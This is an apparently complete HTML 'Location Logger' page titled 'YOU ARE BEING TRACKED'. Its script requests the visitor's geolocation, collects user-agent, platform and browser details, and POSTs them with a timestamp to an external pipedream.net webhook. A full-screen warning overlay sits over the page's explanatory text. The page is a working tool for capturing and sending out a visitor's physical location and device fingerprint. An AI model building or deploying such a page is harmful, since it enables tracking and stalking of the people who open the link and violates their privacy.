<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>YOU ARE BEING TRACKED</title>
  
  <!-- Google Fonts preload -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Nosifer&display=swap" rel="stylesheet">

  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      width: 100%;
      overflow: hidden;
      font-family: Arial, sans-serif;
    }

    /* Fullscreen creepy warning */
    #warning {
      position: fixed;
      top: 0;
      left: 0;
      height: 100vh;
      width: 100vw;
      background-color: darkred;
      display: flex;
      justify-content: center;
      align-items: center;
      color: white;
      font-size: 5vw;
      font-family: 'Nosifer', cursive;
      text-align: center;
      z-index: 9999;
    }

    h1, p {
      position: relative;
      z-index: 1;
      color: white;
      text-align: center;
    }
  </style>
</head>
<body>
  <div id="warning">
    YOU ARE BEING TRACKED
  </div>

  <h1>Location Logger</h1>
  <p>Click allow to send your coordinates</p>

  <script>
    // Function to detect device info
    function getDeviceInfo() {
      const ua = navigator.userAgent;
      const platform = navigator.platform;
      let deviceType = "Unknown";

      if (/Mobi|Android/i.test(ua)) deviceType = "Mobile";
      else if (/iPad|Tablet/i.test(ua)) deviceType = "Tablet";
      else deviceType = "Desktop";

      return {
        userAgent: ua,
        platform: platform,
        deviceType: deviceType,
        browser: (() => {
          if (ua.indexOf("Chrome") > -1) return "Chrome";
          if (ua.indexOf("Firefox") > -1) return "Firefox";
          if (ua.indexOf("Safari") > -1 && ua.indexOf("Chrome") === -1) return "Safari";
          if (ua.indexOf("Edge") > -1) return "Edge";
          return "Other";
        })()
      };
    }

    // Request geolocation
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const deviceInfo = getDeviceInfo();
          fetch("https://eo6f81z4derf3yg.m.pipedream.net", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              timestamp: new Date().toISOString(),
              lat: pos.coords.latitude,
              lon: pos.coords.longitude,
              device: deviceInfo
            })
          });
          console.log("Coords + device info sent!");
        },
        (err) => console.error("Geo error:", err)
      );
    } else {
      console.log("Geolocation not supported");
    }
  </script>
</body>
</html>
